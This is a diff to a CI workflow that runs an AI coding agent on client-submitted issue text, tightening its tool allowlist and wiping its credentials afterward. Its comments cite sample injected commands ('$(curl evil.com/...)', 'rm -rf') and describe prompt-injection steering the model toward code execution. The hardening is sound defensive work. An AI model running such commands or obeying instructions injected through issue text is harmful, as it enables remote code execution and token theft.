@@ -82,7 +82,18 @@ jobs:
         # SECURITY: prompt is piped via stdin, NOT command-substituted. The
         # prompt file is built from client-submitted issue title + description
         # in claim_issue.py — a hostile client could otherwise inject
-        # $(curl evil.com/...) or `rm -rf` into bash via $(cat).
+        # $(curl evil.com/...) or `rm -rf` into bash via $(cat). The issue text
+        # is additionally nonce-fenced as untrusted data in claim_issue.py.
+        #
+        # SECURITY (SEC-001): the issue text is untrusted client input and a
+        # prompt-injection payload could steer the model. The allowed-tools list
+        # is therefore an EXACT verification-only allowlist — it must NOT contain
+        # `Bash(node:*)` (matches `node -e "<arbitrary JS>"` = RCE) or a wildcard
+        # `Bash(npm run *:*)` (runs arbitrary scripts). Only the specific
+        # lint/typecheck/test commands the protocol uses are permitted. The
+        # cross-tenant SOLVER_GITHUB_TOKEN is kept OUT of this step (it is not in
+        # env here, and repo.py strips it from ./client-repo/.git/config after
+        # cloning), so it is not reachable even if the model is injected.
         #
         # continue-on-error lets finalize.py inspect the working tree for any
         # changes Claude made, even if the CLI exits non-zero on edge cases
@@ -95,9 +106,16 @@ jobs:
           claude --print \
             --model claude-opus-4-8 \
             --max-turns 80 \
-            --allowed-tools "Read,Edit,Write,Glob,Grep,Bash(npm run *:*),Bash(node:*),Bash(npx tsc:*),Bash(git diff:*),Bash(git status:*),Bash(git show:*)" \
-            --disallowed-tools "Bash(git push:*),Bash(git commit:*),Bash(rm:*),WebFetch,WebSearch" \
+            --allowed-tools "Read,Edit,Write,Glob,Grep,Bash(npm run lint:*),Bash(npm run typecheck:*),Bash(npm test:*),Bash(npx tsc:*),Bash(git diff:*),Bash(git status:*),Bash(git show:*)" \
+            --disallowed-tools "Bash(git push:*),Bash(git commit:*),Bash(rm:*),Bash(node:*),WebFetch,WebSearch" \
             < /tmp/agent-prompt.md
+
+      - name: Wipe Claude credentials
+        if: always() && steps.claim.outputs.has_issue == 'true'
+        # SECURITY (SEC-001): remove the OAuth credentials file as soon as the
+        # untrusted agent run is over, so it cannot linger into later steps.
+        # `always()` so it runs even if the Claude step errored or timed out.
+        run: rm -f "$HOME/.claude/.credentials.json"
 
       - name: Commit, push, mark done
         if: steps.claim.outputs.has_issue == 'true'
